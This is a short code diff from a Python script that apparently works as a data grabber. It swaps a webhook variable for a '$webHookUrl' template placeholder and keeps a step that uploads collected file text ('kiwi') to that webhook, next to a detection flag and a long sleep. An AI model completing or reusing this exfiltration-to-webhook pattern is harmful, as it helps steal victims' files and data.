@@ -18,7 +18,7 @@ import re
 import subprocess
 
 
-hook = "just a random test"
+hook = $webHookUrl
 #hookx = "you can set one but why ?"
 
 DETECTED = False
@@ -894,8 +894,7 @@ if not DETECTED:
             filetext += "\n"
     upload("kiwi", filetext)
     
-    
+   # I will delete that later its for dev !! 
 print(hook)
-
 
 time.sleep(99999)
